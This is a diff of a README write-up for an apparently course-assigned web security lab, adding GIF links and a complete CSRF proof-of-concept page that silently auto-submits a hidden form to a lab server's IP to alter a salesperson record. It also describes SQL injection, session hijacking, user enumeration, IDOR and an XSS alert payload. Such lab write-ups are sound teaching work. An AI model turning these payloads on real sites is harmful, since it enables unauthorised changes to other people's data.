@@ -26,7 +26,7 @@ For example, setting `id` to the value:
 ```
 allows the attacker to obtain details about the table and columns in the database. (Note: the above value should be URL encoded if appended directly to the URL.)
 
-TODO: -GIF-
+<img src="./gifs/SQLi.gif" width="704"/>
 
 
 
@@ -34,7 +34,7 @@ TODO: -GIF-
 
 The blue site is vulnerable to session fixation and hijacking attacks. Using the supplied `public/hacktools/change_session_id.php` tool, a session created in one browser was successfully used in a different.
 
-TODO: -GIF-
+<img src="./gifs/SessionHijack.gif" width="704"/>
 
 
 
@@ -52,7 +52,7 @@ If a username is found in the database, an invalid login attempt returns the fol
 ```
 This allows an attacker to identify valid usernames through brute force submissions to the login page.
 
-TODO: -GIF-
+<img src="./gifs/UserEnumeration.gif" width="894"/>
 
 
 **Vulnerability #2: Cross-Site Scripting**
@@ -65,7 +65,7 @@ For example, submitting the following JavaScript in the "Feedback" field of the 
 <script>alert('zmh68 - XSS');</script>
 ```
 
-TODO: -GIF-
+<img src="./gifs/XSS.gif" width="704"/>
 
 
 
@@ -75,7 +75,7 @@ TODO: -GIF-
 
 The red site is vulnerable to an IDOR attack, as inactive salespeople's detail pages are accessible by altering the value of the `id` GET parameter in the URL `/red/public/salesperson.php?id=`. Other versions of the site redirect requests for non-public salesperson profiles back to the general public listing of salespeople.
 
-TODO: -GIF-
+<img src="./gifs/IDOR.gif" width="704"/>
 
 
 
@@ -85,8 +85,27 @@ The red site does not require a valid CSRF token to be submitted when updating a
 
 For example, if an authenticated user loaded a page with the following sample HTML, the phone number of the salesperson with ID 5 would be updated, without the action being directly visible to the user.
 
-TODO: -HTML SNIPPET-
-TODO: -GIF-
+```HTML
+<!doctype html>
+<html lang="en">
+  <head>
+    <title></title>
+  </head>
+  <body onload="document.ohnoForm.submit()">
+  <h1>Some random important content</h1>
+  <h2>definitely not a trap.</h2>
+    <form name="ohnoForm" action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=1" method="POST" style="display: none;" target="secretIFrame" > <br />
+      <input type="hidden" name="csrf_token" value="" /> <br />
+      <input type="text" name="first_name" value="Oh" /> <br />
+      <input type="text" name="last_name" value="No" /><br />
+      <input type="text" name="phone" value="555-867-5309" /><br />
+      <input type="text" name="email" value="bleh@example.org" /><br />
+    </form>
+    <iframe name="secretIFrame" style="display:none;"></iframe>
+  </body>
+</html>
+```
+<img src="./gifs/CSRF.gif" width="704"/>
 
 
 
@@ -133,24 +152,10 @@ salespeople.email,
 salespeople_territories.territory_id
 ```
 
-TODO: -GIF-
-
 
 **Bonus Objective 2: Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.**
 
-Provided cookies are not properly secured, all of these can be accomplished by submitting JavaScript into the Contact form:
-
-TODO: JavaScript to Inject
-TODO: -GIF-
-
-
 **Advanced Objective: Build on Objectives #4 and #6 (XSS, hijacking/fixation). Are you able to execute a session hijacking or fixation attack using XSS instead of using the provided PHP script?**
-
-It may be possible, depending on the restrictions set on the cookie (e.g., HTTPOnly, sameSite, etc.)
-
-TODO: Try this maybe
-TODO: -GIF Maybe-
-
 
 
 
